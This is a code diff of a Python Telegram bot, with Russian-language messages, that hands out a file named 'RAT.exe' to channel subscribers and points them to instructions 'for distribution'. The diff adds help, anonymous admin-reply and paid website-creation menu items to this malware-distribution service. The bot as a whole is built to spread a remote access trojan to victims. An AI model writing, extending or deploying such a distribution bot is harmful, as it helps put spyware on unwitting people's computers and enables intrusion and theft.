@@ -12,7 +12,7 @@ CHANNEL_ID = '-1002331312384'
 RAT_FILE_PATH = 'RAT.exe'
 
 # ID администратора
-ADMIN_ID = '1258446750'
+ADMIN_ID = 'YOUR_ADMIN_ID'
 
 bot = telebot.TeleBot(API_TOKEN)
 
@@ -46,11 +46,13 @@ def send_welcome(message):
             with open(RAT_FILE_PATH, 'rb') as file:
                 bot.send_document(message.chat.id, file)
             
-            # Добавляем кнопку "Инструкция"
+            # Добавляем кнопки "Инструкция", "Помощь" и "Создание сайта"
             markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
             instruction_button = types.KeyboardButton("Инструкция")
-            markup.add(instruction_button)
-            bot.send_message(message.chat.id, "Нажмите кнопку 'Инструкция' для получения инструкции по распространению.", reply_markup=markup)
+            help_button = types.KeyboardButton("Помощь")
+            create_site_button = types.KeyboardButton("Создание сайта")
+            markup.add(instruction_button, help_button, create_site_button)
+            bot.send_message(message.chat.id, "Выберите действие:", reply_markup=markup)
         else:
             send_subscription_buttons(message.chat.id)
     except Exception as e:
@@ -80,11 +82,13 @@ def check_subscription(call):
             with open(RAT_FILE_PATH, 'rb') as file:
                 bot.send_document(call.message.chat.id, file)
             
-            # Добавляем кнопку "Инструкция"
+            # Добавляем кнопки "Инструкция", "Помощь" и "Создание сайта"
             markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
             instruction_button = types.KeyboardButton("Инструкция")
-            markup.add(instruction_button)
-            bot.send_message(call.message.chat.id, "Нажмите кнопку 'Инструкция' для получения инструкции по распространению.", reply_markup=markup)
+            help_button = types.KeyboardButton("Помощь")
+            create_site_button = types.KeyboardButton("Создание сайта")
+            markup.add(instruction_button, help_button, create_site_button)
+            bot.send_message(call.message.chat.id, "Выберите действие:", reply_markup=markup)
         else:
             send_subscription_buttons(call.message.chat.id)
     except Exception as e:
@@ -120,8 +124,8 @@ def send_instruction(message):
     )
     bot.send_message(message.chat.id, instruction)
 
-# Обработка команды /help
-@bot.message_handler(commands=['help'])
+# Обработка команды "Помощь"
+@bot.message_handler(func=lambda message: message.text == "Помощь")
 def handle_help(message):
     user_id = message.from_user.id
     username = message.from_user.username or message.from_user.first_name
@@ -137,13 +141,34 @@ def handle_help(message):
     bot.forward_message(ADMIN_ID, message.chat.id, message.message_id)
     bot.send_message(message.chat.id, "Ваше сообщение отправлено в техподдержку. Ожидайте ответа.")
 
+# Обработка команды "Создание сайта"
+@bot.message_handler(func=lambda message: message.text == "Создание сайта")
+def handle_create_site(message):
+    user_id = message.from_user.id
+    username = message.from_user.username or message.from_user.first_name
+    
+    # Сохранение информации о пользователе
+    save_user_info(user_id, username)
+    
+    # Проверка, забанен ли пользователь
+    if is_banned(user_id):
+        return
+    
+    site_description = (
+        "Опишите, для чего нужен сайт, и подробно опишите, что должно быть на сайте. "
+        "ВАЖНО: Отправьте это одним сообщением, иначе блокировка на 4 часа. "
+        "После того как отправите сообщение, с вами свяжется наш web разработчик, "
+        "время ожидания ответа от 5 минут до 48 часов. Цена будет договорная."
+    )
+    bot.send_message(message.chat.id, site_description)
+
 # Обработка ответа администратора
 @bot.message_handler(func=lambda message: message.reply_to_message is not None and message.from_user.id == int(ADMIN_ID))
 def handle_admin_reply(message):
     original_message = message.reply_to_message
     user_id = original_message.forward_from.id
     
-    # Отправка ответа пользователю
+    # Отправка анонимного ответа пользователю
     bot.send_message(user_id, message.text)
 
 # Запуск бота
